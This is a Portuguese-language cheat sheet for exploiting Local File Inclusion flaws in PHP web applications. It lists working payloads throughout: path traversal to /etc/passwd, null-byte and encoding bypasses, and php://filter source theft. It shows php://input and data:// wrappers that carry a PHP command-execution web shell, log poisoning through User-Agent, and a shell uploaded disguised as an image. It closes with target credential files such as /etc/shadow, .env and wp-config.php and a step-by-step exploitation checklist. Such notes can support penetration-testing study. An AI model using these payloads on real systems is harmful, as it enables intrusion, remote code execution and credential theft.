
---

## 📌 **LFI – Local File Inclusion**

### ✅ O que é LFI?
LFI é uma vulnerabilidade que permite a um atacante incluir arquivos locais do servidor no navegador, através da manipulação de parâmetros em aplicações web vulneráveis.

Exemplo típico:
```
http://site.com/index.php?page=about
```

Se o parâmetro `page` for vulnerável e não houver validação adequada, é possível tentar incluir arquivos arbitrários do sistema, como:
```
http://site.com/index.php?page=../../../../etc/passwd
```

---

## 🔍 Objetivos do LFI

- Ler arquivos sensíveis (`/etc/passwd`, logs, arquivos `.env`, etc).
- Conseguir **RCE** (execução remota de comandos) em casos com wrappers como `php://input` ou upload de shell.
- Enumerar diretórios e arquivos do sistema.
- Explorar mal uso de funções como `include`, `require`, `fopen`, `file_get_contents`, etc.

---

## 🧬 Formas de Bypass em LFI

### 1. **Bypass com Diretórios**
Usar múltiplos `../` para subir na árvore de diretórios:
```php
?page=../../../../../../etc/passwd
```

#### Dica:
- Pode ser necessário repetir `../` muitas vezes até alcançar a raiz.
- Pode usar scripts para automatizar isso (ex: `wfuzz`, `ffuf`, `burp intruder`).

---

### 2. **Truncamento de Sufixo (Null Byte Injection)**

Alguns servidores antigos (ou versões antigas do PHP) permitem o uso de `%00` (null byte) para truncar strings e ignorar extensões adicionadas pelo código.

Exemplo:
```php
?page=../../../../etc/passwd%00
```

> ⚠️ Esse bypass depende da configuração do servidor e da versão do PHP. Desde o PHP 5.3 ele foi mitigado.

---

### 3. **Bypass com Wrappers do PHP**

#### a) `php://filter`

Permite ler arquivos como base64 sem executá-los:
```
?page=php://filter/read=convert.base64-encode/resource=index.php
```
🔍 **Utilidade**: exfiltrar código-fonte PHP protegido.

#### b) `php://input`  
Usado para tentar RCE quando a entrada é incluída com `include("php://input")`.

```
POST /index.php?page=php://input
Content-Type: application/x-www-form-urlencoded

<?php system($_GET['cmd']); ?>
```
E acessar via:
```
/index.php?page=php://input&cmd=id
```

> ⚠️ Necessita que a entrada seja usada dentro de uma função de inclusão.

#### c) `data://`
Cria um stream em base64, semelhante ao `php://input`.

```
?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
```
Este base64 decodifica para: `<?php system($_GET['cmd']); ?>`

---

### 4. **Bypass com Codificação**

#### a) URL Encoding
```
?page=..%2f..%2f..%2fetc%2fpasswd
```

#### b) Double Encoding
```
?page=..%252f..%252fetc%252fpasswd
```

#### c) Mixed Encoding
Alguns WAFs permitem partes codificadas:
```
?page=..%2f..%252fetc/passwd
```

---

### 5. **Bypass com Inclusão de Logs**

Explorar arquivos de log com código PHP injetado por User-Agent, Referer, etc.

1. Enviar request com:
```
User-Agent: <?php system($_GET['cmd']); ?>
```

2. Incluir o arquivo de log:
```
?page=/var/log/apache2/access.log&cmd=id
```

> **Paths comuns de logs**:
- `/var/log/apache2/access.log`
- `/var/log/httpd/access_log`
- `/var/log/nginx/access.log`

---

### 6. **Bypass via Uploads**

1. Fazer upload de um arquivo com extensão `.jpg` ou `.txt` contendo PHP.

```php
<?php system($_GET['cmd']); ?>
```

2. Descobrir o caminho do arquivo (por brute-force ou diretório previsível).

3. Incluir:
```
?page=/uploads/shell.jpg&cmd=id
```

---

### 7. **Wrapper Input com Post Injection (LFI to RCE)**

PHP permite wrappers como `php://input`, e o código será interpretado se usado dentro de `include()`.

Exemplo:
```php
include($_GET['page']);
```

POST:
```http
POST /index.php?page=php://input
Content-Type: text/plain

<?php system($_GET['cmd']); ?>
```

Acesso:
```
/index.php?page=php://input&cmd=whoami
```

---

### 🧪 Ferramentas úteis

- **Burp Suite** – Automação de fuzzing em parâmetros.
- **wfuzz / ffuf** – Fuzzing de diretórios e caminhos.
- **Liffy** – Ferramenta em Python para exploração de LFI.
- **LFI Suite** – Ferramenta para automatizar leitura de arquivos com LFI.

---

### 🧷 Dicas de Arquivos Interessantes para LFI

| Sistema | Caminho |
|--------|--------|
| Linux | `/etc/passwd`, `/etc/hostname`, `/etc/shadow` (se tiver permissão) |
| Apache | `/var/log/apache2/access.log` |
| Nginx | `/var/log/nginx/access.log` |
| PHP | `/var/log/php_errors.log`, `php://filter/...` |
| Webapps | `.env`, `config.php`, `wp-config.php` |

---

## ✅ **Checklist para Exploração de LFI**

1. Testar inclusão básica com `../../../etc/passwd`
2. Testar wrappers `php://filter`, `php://input`, `data://`
3. Tentar truncamento `%00` se PHP antigo
4. Injetar payloads em logs (User-Agent)
5. Verificar possibilidade de upload + inclusão
6. Tentar codificações (%2e%2e%2f, double encoding)
7. Automatizar brute-force de caminhos sensíveis

---
